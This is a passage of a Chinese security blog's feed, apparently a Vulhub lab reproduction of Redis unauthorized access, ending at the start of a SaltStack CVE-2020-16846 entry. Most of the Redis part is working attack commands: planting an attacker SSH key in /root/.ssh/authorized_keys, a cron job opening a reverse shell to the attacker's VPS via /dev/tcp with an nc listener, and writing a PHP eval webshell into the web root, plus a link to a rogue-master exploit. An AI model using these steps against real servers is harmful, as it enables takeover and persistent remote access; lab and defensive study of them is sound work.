+<p><img src="https://image.3001.net/images/20220110/16417819547236.png" alt="image-20211216171236794"></p>
+<p><strong>info：</strong>读取Redis敏感数据</p>
+<p><img src="https://image.3001.net/images/20220110/16417819626383.png" alt="image-20211216171334759"></p>
+<p><strong>keys：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">NAME</th>
+<th align="center">CONTENT</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">keys *</td>
+<td align="center">读取全部key及其对应的值</td>
+</tr>
+<tr>
+<td align="center">get <key></td>
+<td align="center">读取某个key值</td>
+</tr>
+<tr>
+<td align="center">set <key></td>
+<td align="center">增加key</td>
+</tr>
+<tr>
+<td align="center">flushall</td>
+<td align="center">删除所有key</td>
+</tr>
+<tr>
+<td align="center">del key</td>
+<td align="center">删除某个key</td>
+</tr>
+</tbody></table>
+<p><strong>config：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">NAME</th>
+<th align="center">CONTENT</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">config get dir</td>
+<td align="center">读取备份目录</td>
+</tr>
+<tr>
+<td align="center">config set dir</td>
+<td align="center">设置备份目录</td>
+</tr>
+<tr>
+<td align="center">config get dbfilename</td>
+<td align="center">读取备份文件名</td>
+</tr>
+<tr>
+<td align="center">config set dbfilename</td>
+<td align="center">设置备份文件名</td>
+</tr>
+</tbody></table>
+<p><strong>slaveof：</strong><code>slaveof &lt;vpsIP&gt; PORT</code> 设置主从关系</p>
+<p>exp:<a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<h3 id="未授权getshell"><a href="#未授权getshell" class="headerlink" title="未授权getshell"></a>未授权getshell</h3><h4 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h4><p>条件：拥有root权限 或 对 <code>/root/.ssh/</code> 目录可写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#vps生成一个公钥</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">#将公钥写入靶机的key</span><br><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)  &gt;  gy.txt</span><br><span class="line">cat gy.txt | redis-cli -h &lt;targetIP&gt; -x set gy       #-x参数是将管道符之前的内容写入key</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;      #如果没有权限则无法getshell</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">get gy</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\ ssh-rsa AAAAB.......3NzaC1ajVNsN48P root@kali\n\n\&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h4 id="crontab定时任务反弹shell"><a href="#crontab定时任务反弹shell" class="headerlink" title="crontab定时任务反弹shell"></a>crontab定时任务反弹shell</h4><p>条件：对 <code>/var/spool/cron</code> 目录可写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#vps监听一个端口</span><br><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set joker &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;&lt;VPSIP&gt;&#x2F;&lt;PORT&gt; 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron           #如果没有权限则无法getshell</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h4 id="网站写马"><a href="#网站写马" class="headerlink" title="网站写马"></a>网站写马</h4><p>条件：已知网站根目录路径 且 目录可写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set joker &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SaltStack Shell 注入 (CVE-2020-16846)</title>
     <url>/2021/12/16/SaltStack%20Shell%20%E6%B3%A8%E5%85%A5%20(CVE-2020-16846)/</url>
     <content><![CDATA[<h1 id="SaltStack-Shell-注入-CVE-2020-16846"><a href="#SaltStack-Shell-注入-CVE-2020-16846" class="headerlink" title="SaltStack Shell 注入 (CVE-2020-16846)"></a>SaltStack Shell 注入 (CVE-2020-16846)</h1><p>Salt 是一种建立在动态通信总线上的基础设施管理新方法。Salt 可用于数据驱动的编排、任何基础设施的远程执行、任何应用程序堆栈的配置管理等等。</p>
